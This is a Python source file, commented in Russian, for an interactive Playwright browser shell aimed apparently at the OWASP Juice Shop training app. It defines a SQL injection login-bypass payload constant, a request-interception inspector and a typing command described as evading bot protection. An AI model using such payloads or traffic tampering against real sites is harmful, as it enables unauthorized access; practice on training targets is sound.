import sys
import os
import shlex
import inspect
import json
import asyncio
from datetime import datetime
from functools import wraps
from playwright.async_api import async_playwright

# Глобальное состояние инспектора
inspector_state = {
    "enabled": False,           # Включён ли перехват
    "queue": [],                # Очередь перехваченных запросов
    "current_index": 0,         # Текущий индекс в очереди
    "auto_continue": False,     # Пропускать ли автоматически
    "filter_url": None,         # Фильтр по URL
    "filter_method": None,      # Фильтр по методу (GET/POST)
    "intercepted_count": 0,     # Счётчик перехваченных
    "history": []               # История обработанных запросов
}

# Состояние инспектора трафика
inspector = {
    "enabled": False,
    "queue": [],           # Очередь перехваченных запросов
    "history": [],         # Обработанные запросы
    "filter_url": None,    # Фильтр по URL
    "filter_method": None, # Фильтр по методу
    "auto": False,         # Авто-пропуск
}

# Максимальная длина для отображения
MAX_URL_DISPLAY = 60
MAX_BODY_DISPLAY = 500

# Глобальные переменные для Playwright
playwright = None
browser = None
page = None
login_response_data = None
TARGET_URL = "https://juice-shop.herokuapp.com"
SQLI_PAYLOAD = "admin' or 1=1 --"

class Command:
    """
    Декоратор для регистрации команд с поддержкой алиасов и документации
    """
    def __init__(self, name=None, aliases=None, description=None, usage=None, example=None, notes=None):
        self.name = name
        self.aliases = aliases or []
        self.description = description
        self.usage = usage
        self.example = example
        self.notes = notes
    
    def __call__(self, func):
        # Сохраняем метаданные команды
        func._is_command = True
        func._command_name = self.name or func.__name__.replace('cmd_', '', 1)
        func._command_aliases = self.aliases
        func._command_description = self.description
        func._command_usage = self.usage
        func._command_example = self.example
        func._command_notes = self.notes
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            return func(*args, **kwargs)
        return wrapper

class SimpleShell:
    def __init__(self):
        self.prompt = "playwright> "
        self.running = True
        self.commands = {}
        self._discover_commands()
        self.loop = None
        
    def _get_loop(self):
        """Получить или создать цикл событий"""
        if self.loop is None or self.loop.is_closed():
            try:
                self.loop = asyncio.get_running_loop()
            except RuntimeError:
                self.loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self.loop)
        return self.loop
    
    def _discover_commands(self):
        """
        Автоматически обнаруживает и регистрирует все команды
        """
        # Сначала ищем методы, помеченные декоратором @Command
        for name, method in inspect.getmembers(self, predicate=inspect.ismethod):
            if hasattr(method, '_is_command') and method._is_command:
                # Регистрируем команду по основному имени
                cmd_name = method._command_name
                self.commands[cmd_name] = method
                
                # Регистрируем алиасы
                for alias in getattr(method, '_command_aliases', []):
                    self.commands[alias] = method
                
                # Также регистрируем по имени метода для обратной совместимости
                if name.startswith('cmd_') and name[4:] not in self.commands:
                    self.commands[name[4:]] = method
        
        # Затем добавляем методы с префиксом cmd_, которые не были зарегистрированы
        for name, method in inspect.getmembers(self, predicate=inspect.ismethod):
            if name.startswith('cmd_') and not hasattr(method, '_is_command'):
                cmd_name = name[4:]
                if cmd_name not in self.commands:
                    self.commands[cmd_name] = method

    def parse_input(self, user_input):
        """
        Разбивает строку на команду и аргументы с поддержкой кавычек
        """
        try:
            parts = shlex.split(user_input.strip())
            if not parts:
                return None, []
            return parts[0], parts[1:]
        except ValueError as e:
            print(f"shell: ошибка синтаксиса: {e}")
            return None, []

    def execute(self, command, args):
        """
        Выполняет команду shell с правильной обработкой асинхронных команд
        """
        if not command:
            return

        if command in self.commands:
            cmd_method = self.commands[command]
            
            try:
                # Проверяем, является ли команда асинхронной
                # Для методов нужно проверять исходную функцию
                is_async = asyncio.iscoroutinefunction(cmd_method) or \
                        (hasattr(cmd_method, '__wrapped__') and 
                        asyncio.iscoroutinefunction(cmd_method.__wrapped__))
                
                if is_async:
                    # Для асинхронных команд всегда используем run_until_complete
                    # с нашим управляемым циклом
                    if self.loop is None or self.loop.is_closed():
                        self.loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(self.loop)
                    
                    # Запускаем корутину в цикле
                    self.loop.run_until_complete(cmd_method(args))
                else:
                    # Синхронная команда
                    cmd_method(args)
                        
            except Exception as e:
                print(f"❌ Ошибка выполнения команды: {type(e).__name__}: {e}")
                # Для отладки можно раскомментировать:
                # import traceback
                # traceback.print_exc()
        else:
            print(f"shell: команда '{command}' не найдена")
            print(f"Введите 'help' для списка доступных команд")

    def run(self):
        """
        Запускает основной цикл оболочки с правильной обработкой asyncio
        """
        print("="*60)
        print("           PLAYWRIGHT INTERACTIVE SHELL")
        print("="*60)
        print("Введите 'help' для списка команд, 'exit' для выхода.\n")
        
        # Создаём цикл событий один раз для всего времени работы
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        while self.running:
            try:
                user_input = input(self.prompt)
                if not user_input.strip():
                    continue
                    
                command, args = self.parse_input(user_input)
                
                if command:
                    self.execute(command, args)
                    
            except KeyboardInterrupt:
                print("\nИспользуйте 'exit' для выхода.")
            except EOFError:
                print("\n")
                break
            except Exception as e:
                print(f"❌ Ошибка: {type(e).__name__}: {e}")
        
        # Корректное завершение
        self._shutdown()

    def _print_tree(self, node, prefix="", is_last=True, show_text=False):
        """Рекурсивный вывод дерева с красивым форматированием"""
        if not node or node.get('error'):
            return
        
        # Символы для отрисовки дерева
        branch = "└── " if is_last else "├── "
        extension = "    " if is_last else "│   "
        
        # Формируем строку тега
        tag = node['tag']
        
        # Добавляем маркеры для важных элементов
        markers = []
        if node.get('interactive'):
            markers.append("⚡")
        if node.get('visible') == False:
            markers.append("👁️‍🗨️")
        
        # Атрибуты для отображения
        attrs = node.get('attrs', {})
        attr_str = ""
        
        # Приоритет: id > class > name > role
        if '#id' in attrs:
            attr_str = f"#{attrs['#id']}"
        elif '.class' in attrs:
            attr_str = f".{attrs['.class']}"
        elif 'name' in attrs:
            attr_str = f"[name={attrs['name']}]"
        elif 'role' in attrs:
            attr_str = f"[role={attrs['role']}]"
        
        # Тип для инпутов
        if 'type' in attrs and tag == 'input':
            attr_str += f"(type={attrs['type']})"
        
        # Текст если есть
        text_part = f' "{node["text"]}"' if show_text and node.get('text') else ''
        
        # Собираем строку
        markers_str = " ".join(markers) + " " if markers else ""
        attr_part = f" {attr_str}" if attr_str else ""
        
        print(f"{prefix}{branch}{markers_str}<{tag}{attr_part}>{text_part}")
        
        # Рекурсия по детям
        children = node.get('children', [])
        for i, child in enumerate(children):
            is_last_child = (i == len(children) - 1)
            self._print_tree(child, prefix + extension, is_last_child, show_text)

    def _shutdown(self):
        """Корректное завершение работы"""
        print("\n🔄 Завершение работы...")
        
        # Закрываем браузер, если он открыт
        if self.loop and not self.loop.is_closed():
            if browser or page or playwright:
                try:
                    self.loop.run_until_complete(self._cleanup_browser())
                except Exception as e:
                    print(f"⚠️ Ошибка при закрытии браузера: {e}")
            self.loop.close()
        
        print("✅ Оболочка завершена")

    async def _cleanup_browser(self):
        """Закрыть браузер и playwright"""
        global playwright, browser, page
        
        print("Закрытие браузера...")
        if page:
            await page.close()
        if browser:
            await browser.close()
        if playwright:
            await playwright.stop()
    
    def _check_browser(self):
        """Проверяет, запущен ли браузер"""
        global page, browser
        if page is None or browser is None:
            print("❌ Браузер не запущен. Сначала выполните 'browser'")
            return False
        return True
    
    async def _smart_click(self, text):
        """Умный поиск элемента по тексту"""
        print(f"🔍 Поиск по тексту: '{text}'...\n")
        
        # Ищем на разных типах элементов
        selectors = [
            f"button:has-text('{text}')",
            f"a:has-text('{text}')",
            f"[role='button']:has-text('{text}')",
            f"input[type='submit']:has-text('{text}')",
            f"input[type='button']:has-text('{text}')",
            f"span:has-text('{text}')",
            f"div:has-text('{text}')",
            f"*:has-text('{text}')",
        ]
        
        for selector in selectors:
            try:
                locator = page.locator(selector).first
                count = await locator.count()
                
                if count > 0:
                    # Проверяем видимость
                    if await locator.is_visible(timeout=2000):
                        await locator.click(timeout=5000)
                        tag = await locator.evaluate('el => el.tagName')
                        full_text = await locator.evaluate('el => el.textContent?.trim().slice(0, 50)')
                        print(f"✅ Клик выполнен: <{tag.lower()}> \"{full_text}\"")
                        print(f"   Селектор: {selector}")
                        return
            except:
                continue
        
        # Если не нашли — выводим похожие элементы
        print(f"❌ Элемент с текстом '{text}' не найден")
        await self._suggest_similar(text)

    async def _suggest_similar(self, text):
        """Предложить похожие элементы"""
        print(f"\n💡 Возможно вы искали:")
        
        try:
            # Ищем все кнопки и ссылки с текстом
            similar = await page.evaluate(f"""
                () => {{
                    const all = document.querySelectorAll('button, a, [role="button"], input[type="submit"], input[type="button"]');
                    const results = [];
                    const searchText = '{text}'.toLowerCase();
                    
                    for (const el of all) {{
                        const txt = el.textContent?.trim().toLowerCase() || '';
                        const aria = el.getAttribute('aria-label')?.toLowerCase() || '';
                        const placeholder = el.placeholder?.toLowerCase() || '';
                        
                        // Ищем частичное совпадение
                        if (txt.includes(searchText) || aria.includes(searchText) || placeholder.includes(searchText)) {{
                            const style = window.getComputedStyle(el);
                            const isVisible = style.display !== 'none' && 
                                            style.visibility !== 'hidden' && 
                                            el.offsetParent !== null;
                            
                            if (isVisible) {{
                                results.push({{
                                    text: el.textContent?.trim().slice(0, 40) || aria || placeholder,
                                    tag: el.tagName.toLowerCase(),
                                    id: el.id || null,
                                    class: el.className?.split(' ').slice(0, 2).join('.') || null
                                }});
                            }}
                        }}
                    }}
                    
                    return results.slice(0, 10);  // Максимум 10 результатов
                }}
            """)
            
            if similar:
                for i, item in enumerate(similar, 1):
                    id_str = f"#{item['id']}" if item.get('id') else ""
                    class_str = f".{item['class']}" if item.get('class') else ""
                    print(f"  {i}. <{item['tag']}> {id_str:15} {class_str:15} \"{item['text']}\"")
                
                print(f"\n💡 Попробуйте: click {similar[0]['text'].split()[0] if similar else ''}")
            else:
                print("  (похожих элементов не найдено)")
                
        except Exception as e:
            print(f"  (ошибка поиска: {e})")

    async def _do_click(self, selector, description):
        """Выполнить клик по селектору"""
        try:
            locator = page.locator(selector).first
            
            # Быстрая проверка видимости (1 секунда таймаут)
            try:
                if await locator.is_visible(timeout=1000):
                    await locator.click(timeout=5000)
                    print(f"✅ Клик: {description}")
                    return
            except:
                pass
            
            # Если не видно — force click
            await locator.click(force=True, timeout=5000)
            print(f"✅ Клик (force): {description}")
            
        except Exception as e:
            raise Exception(f"Не удалось кликнуть: {str(e)[:100]}")

    async def _click_by_text(self, text):
        """Поиск и клик по тексту — ОДИН запрос к браузеру"""
        
        # Все поиски делаем в ОДНОМ page.evaluate()
        result = await page.evaluate(f"""
            () => {{
                const searchText = `{text}`.toLowerCase();
                
                // Все интерактивные элементы
                const candidates = document.querySelectorAll(
                    'button, a, [role="button"], input[type="submit"], input[type="button"], ' +
                    '.mat-mdc-button, .mdc-button, [class*="btn"]'
                );
                
                for (const el of candidates) {{
                    // Получаем текст из разных источников
                    const txt = (el.textContent || '').trim().toLowerCase();
                    const aria = (el.getAttribute('aria-label') || '').toLowerCase();
                    const title = (el.title || '').toLowerCase();
                    const placeholder = (el.placeholder || '').toLowerCase();
                    
                    // Проверяем совпадение (полное или частичное)
                    const allText = txt + ' ' + aria + ' ' + title + ' ' + placeholder;
                    
                    if (allText.includes(searchText)) {{
                        // Проверка видимости
                        const style = window.getComputedStyle(el);
                        if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {{
                            continue;
                        }}
                        if (el.offsetParent === null) {{
                            continue;
                        }}
                        
                        // Нашли! Кликаем и возвращаем информацию
                        el.click();
                        
                        return {{
                            success: true,
                            tag: el.tagName.toLowerCase(),
                            text: (el.textContent || aria || title).trim().slice(0, 50),
                            id: el.id || null,
                            selector: el.id ? '#' + el.id : null
                        }};
                    }}
                }}
                
                return {{ success: false, error: 'Не найдено' }};
            }}
        """)
        
        if result.get('success'):
            id_str = f"#{result['id']}" if result.get('id') else ""
            print(f"✅ Клик: <{result['tag']}> {id_str} \"{result['text']}\"")
        else:
            print(f"❌ Элемент '{text}' не найден")
            # Минимальные подсказки без дополнительных запросов
            print(f"💡 Попробуйте: forceclick {text}")
    
    async def _is_browser_alive(self):
        """Проверка жив ли браузер"""
        try:
            if not page:
                return False
            await page.evaluate("1")
            return True
        except:
            return False
    
    def _print_outline_tree_fixed(self, node, prefix="", is_last=True, depth=0, show_full_links=False):
        """Исправленный вывод дерева с полными ссылками и текстом"""
        if not node:
            return
        
        # Пропускаем контейнеры-заглушки
        if node.get('isContainer'):
            branch = "└── " if is_last else "├── "
            print(f"{prefix}{branch}... (фильтр)")
            for i, child in enumerate(node.get('children', [])):
                is_last_child = (i == len(node['children']) - 1)
                self._print_outline_tree_fixed(child, prefix + ("    " if is_last else "│   "), is_last_child, depth + 1, show_full_links)
            return
        
        branch = "└── " if is_last else "├── "
        extension = "    " if is_last else "│   "
        
        # Маркеры
        markers = []
        if node.get('interactive'):
            markers.append("⚡")
        if node.get('visible') == False:
            markers.append("👁️‍🗨️")
        if node.get('isLink'):
            markers.append("🔗")
        
        tag = node['tag']
        
        # ID и Class
        id_str = f"#{node['id']}" if node.get('id') else ""
        class_str = f".{node['class']}" if node.get('class') else ""
        
        # ✅ ИСПРАВЛЕНИЕ: Показываем ссылки правильно
        attr_str = ""
        attrs = node.get('attrs', {})
        
        # Сначала специальные атрибуты
        if node.get('isLink') and node.get('linkUrl'):
            url = node['linkUrl']
            if show_full_links:
                attr_str += f" [href={url[:80]}{'...' if len(url) > 80 else ''}]"
            else:
                # Показываем только домен + путь без параметров
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    short_url = f"{parsed.netloc}{parsed.path}"
                    if parsed.fragment:
                        short_url += f"#{parsed.fragment}"
                    attr_str += f" [href={short_url[:50]}{'...' if len(short_url) > 50 else ''}]"
                except:
                    attr_str += f" [href={url[:50]}{'...' if len(url) > 50 else ''}]"
        elif node.get('imgUrl'):
            src = node['imgUrl']
            short_src = src.split('/')[-1][:40]
            attr_str += f" [src=.../{short_src}]"
        
        # Остальные атрибуты
        for key, val in attrs.items():
            if key in ['id', 'class', 'href', 'src']:
                continue
            attr_str += f" [{key}={val}]"
        
        # ✅ ИСПРАВЛЕНИЕ: Текст показываем если есть и он не пустой
        text = node.get('text')
        text_str = ""
        if text and text.strip():
            # Обрезаем и очищаем текст
            clean_text = ' '.join(text.split())
            if len(clean_text) > 60:
                text_str = f' "{clean_text[:57]}..."'
            else:
                text_str = f' "{clean_text}"'
        
        # Собираем строку
        markers_str = " ".join(markers) + " " if markers else ""
        line = f"{prefix}{branch}{markers_str}<{tag}{id_str}{class_str}{attr_str}>{text_str}"
        
        # Ограничение длины строки для читаемости
        if len(line) > 150:
            line = line[:147] + "..."
        
        print(line)
        
        # Рекурсия по детям
        children = node.get('children', [])
        for i, child in enumerate(children):
            is_last_child = (i == len(children) - 1)
            self._print_outline_tree_fixed(child, prefix + extension, is_last_child, depth + 1, show_full_links)
    
    async def _on_request_intercept(self, route, request):
        """Обработчик перехваченных запросов"""
        global inspector
        
        if not inspector["enabled"]:
            await route.continue_()
            return
        
        # Применяем фильтры
        if inspector["filter_url"] and inspector["filter_url"] not in request.url:
            await route.continue_()
            return
        if inspector["filter_method"] and inspector["filter_method"] != request.method.upper():
            await route.continue_()
            return
        
        # Парсим тело запроса
        body = None
        body_type = None
        
        if request.method in ["POST", "PUT", "PATCH"] and request.post_data:
            try:
                import json
                body = json.loads(request.post_data)
                body_type = "json"
            except:
                try:
                    from urllib.parse import parse_qs
                    parsed = parse_qs(request.post_data)
                    body = {k: v[0] if len(v)==1 else v for k,v in parsed.items()}
                    body_type = "form"
                except:
                    body = request.post_data
                    body_type = "text"
        
        # Создаём запись
        entry = {
            "id": f"req_{len(inspector['queue'])}",
            "method": request.method,
            "url": request.url,
            "headers": dict(request.headers),
            "body": body,
            "body_type": body_type,
            "route": route,
            "request": request,
            "status": "pending",
            "time": datetime.now().strftime("%H:%M:%S"),
            "modified": False
        }
        
        inspector["queue"].append(entry)
        
        # Уведомление
        if not inspector["auto"]:
            short_url = request.url[:50] + "..." if len(request.url) > 50 else request.url
            print(f"\n🚦 [{entry['id']}] {request.method} {short_url}")
            print(f"💡 inspectlist | inspectskip | inspectedit")
        else:
            try:
                await route.continue_()
                entry["status"] = "continued"
            except:
                pass
    
    def _parse_value(self, v):
        """Парсинг значения для JSON"""
        if v.lower() == 'true': return True
        if v.lower() == 'false': return False
        if v.lower() == 'null': return None
        try: return int(v)
        except:
            try: return float(v)
            except: return v

    # --- Реализация команд ---

    @Command(
        name='help', 
        aliases=['?', 'h'], 
        description='Показать справку по командам',
        usage='help [команда]',
        example='help\nhelp goto',
        notes='Можно использовать "?" или "h" как алиасы'
    )
    def cmd_help(self, args):
        if args and args[0] in self.commands:
            cmd_name = args[0]
            cmd_method = self.commands[cmd_name]
            
            print(f"\n=== Справка по команде: {cmd_name} ===\n")
            
            # Показываем алиасы если есть
            if hasattr(cmd_method, '_command_aliases') and cmd_method._command_aliases:
                aliases = ', '.join(cmd_method._command_aliases)
                print(f"Алиасы: {aliases}")
            
            # Получаем информацию из атрибутов команды
            if hasattr(cmd_method, '_command_description') and cmd_method._command_description:
                print(f"Описание: {cmd_method._command_description}")
            
            if hasattr(cmd_method, '_command_usage') and cmd_method._command_usage:
                print(f"Использование: {cmd_method._command_usage}")
            
            if hasattr(cmd_method, '_command_example') and cmd_method._command_example:
                examples = cmd_method._command_example
                if '\n' in examples:
                    print("Примеры:")
                    for ex in examples.split('\n'):
                        print(f"  {ex}")
                else:
                    print(f"Пример: {examples}")
            
            if hasattr(cmd_method, '_command_notes') and cmd_method._command_notes:
                print(f"Примечание: {cmd_method._command_notes}")
            
            print()
            
        elif args and args[0] not in self.commands:
            print(f"Команда '{args[0]}' не найдена")
            
        else:
            print("\n" + "="*60)
            print("           ДОСТУПНЫЕ КОМАНДЫ")
            print("="*60)
            
            # Группируем команды по основным именам (без алиасов)
            main_commands = {}
            for cmd_name, cmd_method in self.commands.items():
                # Если у метода есть основное имя, используем его для группировки
                if hasattr(cmd_method, '_command_name'):
                    main_name = cmd_method._command_name
                    if main_name not in main_commands:
                        main_commands[main_name] = {
                            'method': cmd_method,
                            'aliases': getattr(cmd_method, '_command_aliases', [])
                        }
            
            # Выводим основные команды
            for cmd_name in sorted(main_commands.keys()):
                cmd_info = main_commands[cmd_name]
                cmd_method = cmd_info['method']
                
                # Получаем описание
                description = "Нет описания"
                if hasattr(cmd_method, '_command_description') and cmd_method._command_description:
                    description = cmd_method._command_description
                
                # Добавляем информацию об алиасах
                if cmd_info['aliases']:
                    aliases_str = f"(алиасы: {', '.join(cmd_info['aliases'])})"
                    description = f"{description} {aliases_str}"
                
                # Обрезаем длинные описания
                if len(description) > 50:
                    description = description[:47] + "..."
                
                print(f"  {cmd_name:<12} - {description}")
            
            print("\n" + "-"*60)
            print("Используйте 'help <команда>' для подробной информации")
            print("Пример: help goto\n")

    @Command(
        name='exit', 
        aliases=['quit', 'q', 'bye'], 
        description='Выйти из оболочки',
        usage='exit',
        example='exit',
        notes='Также работает quit, q, bye'
    )
    def cmd_exit(self, args):
        """Выход из оболочки"""
        print("Завершение работы оболочки...")
        self.running = False

    @Command(
        name='clear', 
        aliases=['cls', 'clr'], 
        description='Очистить экран терминала',
        usage='clear',
        example='clear',
        notes='Работает в Windows (cls), Linux и macOS (clear)'
    )
    def cmd_clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')

    @Command(
        name='browser', 
        aliases=['br', 'launch'], 
        description='Запустить браузер Playwright',
        usage='browser [headless=True]',
        example='browser\nbrowser False',
        notes='По умолчанию запускается в headless режиме'
    )
    async def cmd_browser(self, args):
        """Запуск браузера"""
        global playwright, browser, page
        
        headless = True
        if args and args[0].lower() in ['false', 'no', '0']:
            headless = False
        
        print(f"🚀 Запуск браузера (headless={headless})...")
        
        playwright = await async_playwright().start()
        
        browser = await playwright.chromium.launch(
            headless=headless,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-setuid-sandbox"]
        )
        
        page = await browser.new_page()
        page.set_default_timeout(120000)
        
        print("✅ Браузер успешно запущен")

    @Command(
        name='goto', 
        aliases=['go', 'navigate'], 
        description='Перейти по URL',
        usage='goto <url>',
        example='goto https://juice-shop.herokuapp.com',
        notes='Можно использовать сокращенный URL'
    )
    async def cmd_goto(self, args):
        """Переход по URL"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите URL: goto <url>")
            return
        
        url = args[0]
        if not url.startswith('http'):
            url = 'https://' + url
        
        print(f"🌐 Переход на {url}...")
        await page.goto(url, wait_until="domcontentloaded")
        print(f"✅ Загружено: {page.url}")

    @Command(
        name='fill', 
        aliases=['input', 'type'], 
        description='Заполнить поле формы',
        usage='fill <селектор> <значение>',
        example='fill "#email" admin@test.com\nfill "#password" secret123',
        notes='Значение в кавычках если содержит пробелы'
    )
    async def cmd_fill(self, args):
        """Заполнение поля формы"""
        if not self._check_browser():
            return
        
        if len(args) < 2:
            print("❌ Укажите селектор и значение: fill <селектор> <значение>")
            return
        
        selector = args[0]
        value = args[1]
        
        try:
            await page.wait_for_selector(selector, timeout=5000)
            await page.fill(selector, value)
            print(f"✅ Поле '{selector}' заполнено значением '{value}'")
        except Exception as e:
            print(f"❌ Ошибка заполнения: {e}")

    @Command(
        name='click', 
        aliases=['tap'], 
        description='Кликнуть по элементу (по селектору или тексту)',
        usage='click <селектор_или_текст>',
        example='click #navbarAccount\nclick Dismiss\nclick "Dismiss"',
        notes='Автоматически определяет: #id, .class, или текст кнопки'
    )
    async def cmd_click(self, args):
        """Умный клик по селектору или тексту"""
        if not self._check_browser():
            return
        
        # Проверка соединения с браузером
        if not await self._is_browser_alive():
            print("❌ Браузер не отвечает! Перезапустите: browser")
            return
        
        if not args:
            print("❌ Укажите селектор или текст: click Dismiss")
            return
        
        # Объединяем аргументы если текст с пробелами
        search_text = ' '.join(args)
        
        print(f"🔍 Поиск: '{search_text}'...")
        
        try:
            # Определяем тип запроса
            if search_text.startswith('#'):
                # ID — самый быстрый вариант
                selector = search_text
                await self._do_click(selector, f"ID: {selector}")
            elif search_text.startswith('.'):
                # Class
                selector = search_text
                await self._do_click(selector, f"Class: {selector}")
            elif search_text.startswith('//'):
                # XPath
                selector = f"xpath={search_text}"
                await self._do_click(selector, f"XPath: {search_text}")
            elif ':' in search_text:
                # CSS селектор с псевдо-классом
                selector = search_text
                await self._do_click(selector, f"CSS: {selector}")
            else:
                # Текст — используем ОДИН универсальный селектор
                await self._click_by_text(search_text)
                
        except Exception as e:
            error_msg = str(e)
            
            # Проверка на потерю соединения
            if 'pipe closed' in error_msg.lower() or 'connection closed' in error_msg.lower() or 'TargetClosed' in error_msg:
                print("\n🚨 КРИТИЧЕСКАЯ ОШИБКА: Соединение с браузером разорвано!")
                print("💡 Решение:")
                print("   1. playwright> exit")
                print("   2. Перезапустите скрипт")
                print("   3. playwright> browser")
                self._check_browser()  # Сбросить статус
                return
            
            # Overlay блокирует
            if 'intercepts pointer' in error_msg.lower():
                print(f"⚠️ Клик заблокирован overlay!")
                print("💡 Решение: playwright> forceclick {text}")
            else:
                print(f"❌ Ошибка: {error_msg[:100]}")
            
            # Краткие подсказки (без лишних запросов)
            print(f"\n💡 Попробуйте: click \"{search_text}\" или forceclick {search_text}")

    @Command(
        name='press', 
        aliases=['key', 'type'], 
        description='Нажать клавишу в элементе',
        usage='press <селектор> <клавиша>',
        example='press #s Enter\npress #email Tab\npress body Control+K',
        notes='Поддерживает: Enter, Tab, Escape, ArrowUp, Control+A и др.'
    )
    async def cmd_press(self, args):
        """Нажать клавишу в элементе"""
        if not self._check_browser():
            return
        
        if not await self._is_browser_alive():
            print("❌ Браузер не отвечает! Перезапустите: browser")
            return
        
        if len(args) < 2:
            print("❌ Укажите селектор и клавишу: press #s Enter")
            print("💡 Клавиши: Enter, Tab, Escape, ArrowUp, ArrowDown, Control+A, Control+K")
            return
        
        selector = args[0]
        key = ' '.join(args[1:])
        
        print(f"⌨️  Нажатие '{key}' в '{selector}'...")
        
        try:
            locator = page.locator(selector).first
            
            # Фокус на элемент
            await locator.focus(timeout=3000)
            
            # Нажатие клавиши
            await locator.press(key, timeout=5000)
            
            print(f"✅ Клавиша '{key}' нажата в {selector}")
            
            # Небольшая пауза для обработки
            await page.wait_for_timeout(500)
            
        except Exception as e:
            error_msg = str(e)
            
            if 'Timeout' in error_msg:
                print(f"⚠️ Элемент не найден или не фокусируется: {selector}")
                print("💡 Попробуйте:")
                print(f"   playwright> waitfor {selector} 5000")
                print(f"   playwright> press {selector} {key}")
            elif 'pipe closed' in error_msg.lower() or 'connection closed' in error_msg.lower():
                print("\n🚨 Браузер упал! Перезапустите: browser")
            else:
                print(f"❌ Ошибка: {error_msg[:100]}")
            
            # Предложить альтернативы
            print(f"\n💡 Альтернативы:")
            print(f"   playwright> fill {selector} текст + press {selector} Enter")
            print(f"   playwright> forceclick {selector}")

    @Command(
        name='type', 
        aliases=['typetext', 'slowfill'], 
        description='Посимвольный ввод текста (как человек)',
        usage='type <селектор> <текст>',
        example='type #s apple\ntype #email test@test.com',
        notes='Вводит текст по буквам с задержкой — обходит защиту от ботов'
    )
    async def cmd_type(self, args):
        """Посимвольный ввод текста"""
        if not self._check_browser():
            return
        
        if len(args) < 2:
            print("❌ Укажите селектор и текст: type #s apple")
            return
        
        selector = args[0]
        text = ' '.join(args[1:])
        
        print(f"⌨️  Посимвольный ввод в '{selector}': '{text}'...")
        
        try:
            locator = page.locator(selector).first
            
            # Фокус
            await locator.focus(timeout=3000)
            
            # Очистить поле
            await locator.fill('')
            
            # Ввод по буквам
            for char in text:
                await locator.press(char)
                await page.wait_for_timeout(50)  # Задержка между буквами
            
            print(f"✅ Текст введён: '{text}'")
            
        except Exception as e:
            print(f"❌ Ошибка: {str(e)[:100]}")
            print("💡 Попробуйте: fill {selector} {text}")

    @Command(
        name='enter', 
        aliases=['send', 'submit'], 
        description='Нажать Enter в поле (отправить форму)',
        usage='enter <селектор>',
        example='enter #s\nenter #email',
        notes='Короткая команда для отправки форм'
    )
    async def cmd_enter(self, args):
        """Нажать Enter в поле"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите селектор: enter #s")
            return
        
        selector = args[0]
        
        print(f"📤 Отправка формы (Enter) в '{selector}'...")
        
        try:
            locator = page.locator(selector).first
            await locator.focus(timeout=3000)
            await locator.press('Enter', timeout=5000)
            
            print(f"✅ Enter нажат")
            await page.wait_for_timeout(1000)
            
            # Показать новый URL если изменился
            try:
                url = page.url
                print(f"📌 URL: {url[:70]}")
            except:
                pass
            
        except Exception as e:
            print(f"❌ Ошибка: {str(e)[:100]}")
            print("💡 Попробуйте: click input[type=\"submit\"]")

    @Command(
        name='forceclick', 
        aliases=['fclick', 'fc'], 
        description='Принудительный клик через JavaScript',
        usage='forceclick <текст_или_селектор>',
        example='forceclick Dismiss\nforceclick #navbarAccount',
        notes='Обходит overlay и блокировки — ВСЕГО 1 запрос к браузеру'
    )
    async def cmd_forceclick(self, args):
        """Принудительный клик через JS — один запрос"""
        if not self._check_browser():
            return
        
        if not await self._is_browser_alive():
            print("❌ Браузер не отвечает! Перезапустите: browser")
            return
        
        if not args:
            print("❌ Укажите текст или селектор: forceclick Dismiss")
            return
        
        search_text = ' '.join(args)
        print(f"🔨 Force click: '{search_text}'...")
        
        try:
            result = await page.evaluate(f"""
                () => {{
                    const search = `{search_text}`.toLowerCase();
                    
                    // Если начинается с # или . — это селектор
                    if (search.startsWith('#') || search.startsWith('.')) {{
                        const el = document.querySelector(search);
                        if (el) {{
                            el.click();
                            return {{ success: true, tag: el.tagName, text: el.textContent?.slice(0, 40) }};
                        }}
                        return {{ success: false, error: 'Селектор не найден' }};
                    }}
                    
                    // Иначе ищем по тексту
                    const candidates = document.querySelectorAll('button, a, [role="button"], [class*="btn"]');
                    
                    for (const el of candidates) {{
                        const txt = (el.textContent || el.getAttribute('aria-label') || '').toLowerCase();
                        if (txt.includes(search)) {{
                            el.click();
                            return {{ 
                                success: true, 
                                tag: el.tagName, 
                                text: (el.textContent || el.getAttribute('aria-label')).trim().slice(0, 40)
                            }};
                        }}
                    }}
                    
                    return {{ success: false, error: 'Не найдено' }};
                }}
            """)
            
            if result.get('success'):
                print(f"✅ JS-клик: <{result['tag']}> \"{result.get('text', '')}\"")
            else:
                print(f"❌ {result.get('error')}")
                print(f"💡 Попробуйте: click \"{search_text}\"")
                
        except Exception as e:
            error_msg = str(e)
            if 'pipe closed' in error_msg.lower() or 'connection closed' in error_msg.lower():
                print("\n🚨 Браузер упал! Перезапустите: browser")
            else:
                print(f"❌ Ошибка: {error_msg[:100]}")

    @Command(
        name='check', 
        aliases=['ping', 'alive'], 
        description='Проверить соединение с браузером',
        usage='check',
        example='check',
        notes='Быстрая проверка жив ли браузер'
    )
    async def cmd_check(self, args):
        """Проверка соединения"""
        if not page:
            print("❌ Браузер не запущен")
            return
        
        try:
            start = __import__('time').time()
            await page.evaluate("1")
            elapsed = (__import__('time').time() - start) * 1000
            print(f"✅ Браузер отвечает ({elapsed:.0f}ms)")
            
            # Дополнительная информация
            try:
                url = page.url
                print(f"📌 URL: {url[:60]}")
            except:
                print("📌 URL: неизвестно")
                
        except Exception as e:
            print(f"❌ Браузер не отвечает: {str(e)[:50]}")
            print("💡 Решение: playwright> exit → перезапустите скрипт → browser")

    @Command(
        name='screenshot', 
        aliases=['ss', 'pic'], 
        description='Сделать скриншот',
        usage='screenshot [имя_файла]',
        example='screenshot\nscreenshot login_page.png',
        notes='По умолчанию сохраняется с временной меткой'
    )
    async def cmd_screenshot(self, args):
        """Сделать скриншот"""
        if not self._check_browser():
            return
        
        # filename = args[0] if args else f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        filename = args[0] if args else f"screenshot.png"
        await page.screenshot(path=filename)
        print(f"📷 Скриншот сохранен: {filename}")

    @Command(
        name='wait', 
        aliases=['sleep'], 
        description='Ожидание в миллисекундах',
        usage='wait <мс>',
        example='wait 2000',
